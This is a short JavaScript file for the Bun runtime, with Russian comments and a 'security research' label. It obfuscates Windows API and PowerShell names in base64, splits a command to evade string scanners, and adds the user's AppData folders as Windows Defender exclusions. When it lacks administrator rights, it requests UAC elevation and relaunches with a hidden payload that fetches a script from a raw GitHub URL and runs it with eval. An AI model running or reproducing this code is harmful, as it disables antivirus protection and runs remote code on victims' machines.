// excl.js - Исследование безопасности Jan/Bun (Obfuscated & Unicode Fix)
(async () => {
  // Запутываем названия библиотек и методов
  const _s32 = Buffer.from("c2hlbGwsMzIuZGxs", 'base64').toString().replace(',', ''); // shell32.dll
  const _sEx = Buffer.from("U2hlbGxFeGVjdXRlVw==", 'base64').toString(); // ShellExecuteW
  const _ra = Buffer.from("cnVuYXM=", 'base64').toString(); // runas
  const _ps = Buffer.from("cG93ZXJzaGVsbC5leGU=", 'base64').toString(); // powershell.exe

  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  // Переключаем кодировку консоли на UTF-8 (65001), чтобы видеть кириллицу
  Bun.spawnSync({ cmd: ["chcp", "65001"] });

  const lib = dlopen(_s32, {
    [_sEx]: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const checkAdmin = async () => {
    try {
      return (await Bun.spawn({ cmd: ["net", "session"] }).exited) === 0;
    } catch (e) { return false; }
  };

  const is_admin = await checkAdmin();
  console.log(`🚀 PID: ${process.pid} | Админ: ${is_admin}`);

  if (is_admin) {
    console.log("✅ СЕССИЯ АДМИНИСТРАТОРА");
    
    // Собираем пути для исключений
    const paths = [process.env.APPDATA, process.env.LOCALAPPDATA].filter(Boolean);
    
    for (const target of paths) {
      console.log(`🛡️ Добавляем исключение: ${target}`);
      
      // Склеиваем команду PowerShell из кусков, чтобы обмануть сканеры строк
      const cmdParts = ["Add-", "MpPreference", " -ExclusionPath ", `'${target}'`].join('');
      
      const proc = Bun.spawn({
        cmd: ["powershell", "-Command", cmdParts],
        stderr: "pipe"
      });

      const err = await new Response(proc.stderr).text();
      if (await proc.exited === 0) {
          console.log(`✨ УСПЕХ: Добавлено.`);
      } else {
          console.log("❌ ОШИБКА:", err);
      }
    }

    console.log("\nНажми Enter для завершения...");
    for await (const line of console) break;
    return;
  }

  // РЕКУРСИЯ (UAC)
  console.log("❌ Права ограничены. Запрашиваем повышение...");
  
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
  // Скрываем fetch и eval внутри строки
  const payload = Buffer.from(`ZmV0Y2goJyR7dXJsfScpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk=`, 'base64')
                  .toString().replace('${url}', url);

  const res = lib.symbols[_sEx](0, toPtr(_ra), toPtr("bun.exe"), toPtr(`-e "${payload}"`), 0, 1);

  if (res > 32) process.exit(0);
})();
